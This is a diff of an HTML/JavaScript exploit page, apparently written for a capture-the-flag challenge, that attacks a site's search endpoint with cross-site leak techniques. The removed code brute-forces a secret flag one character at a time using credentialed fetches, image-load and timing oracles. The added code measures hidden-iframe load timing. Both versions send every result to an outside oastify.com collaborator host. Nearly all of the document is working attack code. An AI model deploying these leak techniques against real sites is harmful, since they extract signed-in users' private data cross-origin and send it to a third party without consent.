@@ -2,214 +2,85 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>XS-Leak Exploit</title>
+    <title>Frame Timing XS-Leak</title>
 </head>
 <body>
-    <h1>Exploiting...</h1>
+    <h1>Frame Timing Attack...</h1>
     <pre id="log"></pre>
-
-    <!-- Test: Simple image tag to verify bot visits -->
-    <img src="https://i0j7cw2oc4pgx30tsoskx589b0hr5sth.oastify.com/?f=IMG_TEST&t=1" style="display:none">
 
     <script>
         const log = document.getElementById('log');
-        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!@#$%^&*.,:";
         const TARGET_URL = "https://wonder.cbd2026.cloud";
-        const LEAK_URL = "https://i0j7cw2oc4pgx30tsoskx589b0hr5sth.oastify.com";
-        
-        let flag = "";
-        
+        const LEAK_URL = "https://k6r9iy8qi6vi356vyqym37ebh2ntbvzk.oastify.com";
+
         function logMsg(msg) {
             log.textContent += msg + "\n";
         }
 
-        // Debug: Send START signal immediately using multiple methods
-        try {
-            fetch(`${LEAK_URL}?f=START&t=${Date.now()}`)
-                .then(() => logMsg("START signal sent via fetch"))
-                .catch(e => logMsg("START fetch failed: " + e));
-        } catch(e) {
-            logMsg("START fetch error: " + e);
-        }
-
-        // Also try with image
-        new Image().src = `${LEAK_URL}?f=START_IMG&t=${Date.now()}`;
-        logMsg("START_IMG sent");
-
-        // Also try with script
-        const script = document.createElement('script');
-        script.src = `${LEAK_URL}?f=START_SCRIPT&t=${Date.now()}`;
-        document.body.appendChild(script);
-        logMsg("START_SCRIPT sent");
-
-        async function test(query) {
+        // Frame timing: Load page in iframe and measure load events
+        async function frameTimingAttack(query) {
             const url = `${TARGET_URL}/search?q=${encodeURIComponent(query)}`;
             
-            // Error-based XS-Leak: Try to fetch the search page and check response
-            // If there's a match, the page will have an iframe which we can detect
-            // by checking if we can access it or if it causes different behavior
-            
-            try {
-                const response = await fetch(url, {
-                    mode: 'cors',
-                    credentials: 'include'
-                });
+            return new Promise((resolve) => {
+                const iframe = document.createElement('iframe');
+                let loadCount = 0;
+                const startTime = performance.now();
                 
-                const text = await response.text();
-                
-                // Check if the response contains an iframe
-                const hasIframe = text.includes('<iframe');
-                
-                logMsg(`Test "${query}": hasIframe=${hasIframe}`);
-                fetch(`${LEAK_URL}?f=TEST:${query}:${hasIframe}`)
-                    .catch(e => {});
-                
-                return hasIframe;
-            } catch (e) {
-                // CORS blocked - try another approach
-                logMsg(`CORS blocked for "${query}", trying image load technique`);
-                
-                // Image load technique: Try to load the search page as an image
-                // If it has iframe, it might load differently
-                return new Promise((resolve) => {
-                    const img = new Image();
-                    let loaded = false;
+                iframe.onload = () => {
+                    loadCount++;
+                    const duration = performance.now() - startTime;
                     
-                    img.onload = () => {
-                        loaded = true;
-                        logMsg(`Image loaded for "${query}"`);
-                        fetch(`${LEAK_URL}?f=IMG:${query}:loaded`)
-                            .catch(e => {});
-                        resolve(true);
-                    };
+                    logMsg(`Query: "${query}"`);
+                    logMsg(`  - Load count: ${loadCount}`);
+                    logMsg(`  - Duration: ${duration}ms`);
                     
-                    img.onerror = () => {
-                        logMsg(`Image error for "${query}"`);
-                        fetch(`${LEAK_URL}?f=IMG:${query}:error`)
-                            .catch(e => {});
-                        resolve(false);
-                    };
+                    // Send result
+                    fetch(`${LEAK_URL}?f=FRAME:${encodeURIComponent(query)}:loads=${loadCount}:time=${duration}`)
+                        .catch(e => {});
                     
-                    img.src = url + "&t=" + Date.now();
-                    
-                    // Timeout
                     setTimeout(() => {
-                        if (!loaded) {
-                            logMsg(`Image timeout for "${query}"`);
-                            fetch(`${LEAK_URL}?f=IMG:${query}:timeout`)
-                                .catch(e => {});
-                            resolve(false);
-                        }
-                    }, 3000);
-                });
-            }
-        }
-
-        async function findPrefix() {
-            const prefixes = ["CBD{", "FLAG{", "CTF{", "wonder{", "Wonder{", "WONDER{", "flag{", "cbd{"];
-            
-            logMsg("Finding correct prefix...");
-            
-            for (const prefix of prefixes) {
-                logMsg(`Testing prefix: ${prefix}`);
+                        document.body.removeChild(iframe);
+                        resolve({ loadCount, duration });
+                    }, 1000);
+                };
                 
-                const isMatch = await test(prefix);
+                iframe.onerror = () => {
+                    logMsg(`Error loading: "${query}"`);
+                    fetch(`${LEAK_URL}?f=FRAME:${encodeURIComponent(query)}:error`)
+                        .catch(e => {});
+                    resolve({ loadCount: 0, duration: 0 });
+                };
                 
-                // Send result to server
-                fetch(`${LEAK_URL}?f=PREFIX:${prefix}:${isMatch}`)
-                    .catch(e => logMsg("Failed to send: " + e));
+                iframe.style.display = 'none';
+                iframe.src = url;
+                document.body.appendChild(iframe);
                 
-                if (isMatch) {
-                    logMsg(`✓ Found prefix: ${prefix}`);
-                    return prefix;
-                }
-                
-                await new Promise(r => setTimeout(r, 200));
-            }
-            
-            logMsg("No prefix found, trying empty search...");
-            return "";
-        }
-
-        async function timingAttack(query) {
-            const url = `${TARGET_URL}/search?q=${encodeURIComponent(query)}`;
-            
-            const start = performance.now();
-            const w = window.open(url, "timing_window");
-            
-            if (!w) {
-                return false;
-            }
-            
-            await new Promise(r => setTimeout(r, 3000));
-            
-            const end = performance.now();
-            const duration = end - start;
-            
-            w.close();
-            
-            // If page has iframe, it might take longer to load
-            logMsg(`Timing for "${query}": ${duration}ms`);
-            fetch(`${LEAK_URL}?f=TIMING:${query}:${duration}`)
-                .catch(e => {});
-            
-            return duration > 2000; // Threshold - adjust based on testing
-        }
-
-        async function leakFlag() {
-            // First, find the correct prefix
-            flag = await findPrefix();
-            
-            if (flag === "") {
-                logMsg("Trying brute force from scratch...");
-                // Start with empty and build up
-                flag = "";
-            }
-            
-            logMsg("Starting XS-Leak attack...");
-            logMsg("Current flag: " + flag);
-            
-            while (true) {
-                let found = false;
-                
-                for (const c of chars) {
-                    const testFlag = flag + c;
-                    logMsg(`Testing: ${testFlag}`);
-                    
-                    const isMatch = await test(testFlag);
-                    
-                    if (isMatch) {
-                        flag = testFlag;
-                        logMsg(`✓ Found character: ${c}`);
-                        logMsg(`Current flag: ${flag}`);
-                        
-                        // Send to our server
-                        fetch(`${LEAK_URL}?f=${encodeURIComponent(flag)}`)
-                            .catch(e => logMsg("Failed to send to server: " + e));
-                        
-                        found = true;
-                        break;
+                // Timeout
+                setTimeout(() => {
+                    if (loadCount === 0) {
+                        logMsg(`Timeout: "${query}"`);
+                        fetch(`${LEAK_URL}?f=FRAME:${encodeURIComponent(query)}:timeout`)
+                            .catch(e => {});
+                        resolve({ loadCount: 0, duration: 0 });
                     }
-                    
-                    // Small delay to avoid rate limiting
-                    await new Promise(r => setTimeout(r, 200));
-                }
-                
-                if (!found) {
-                    logMsg("No more characters found!");
-                    logMsg("Final flag: " + flag);
-                    
-                    // Send final result
-                    fetch(`${LEAK_URL}?f=${encodeURIComponent(flag)}&done=1`)
-                        .catch(e => logMsg("Failed to send final result: " + e));
-                    
-                    break;
-                }
-            }
+                }, 5000);
+            });
         }
 
-        // Start the exploit
-        leakFlag().catch(e => logMsg("Error: " + e));
+        async function testQueries() {
+            const queries = ["CBD{", "FLAG{", "test", "xyz", "admin"];
+            
+            logMsg("Starting frame timing attack...");
+            
+            for (const query of queries) {
+                await frameTimingAttack(query);
+                await new Promise(r => setTimeout(r, 1000));
+            }
+            
+            logMsg("Tests completed!");
+        }
+
+        testQueries();
     </script>
 </body>
 </html>
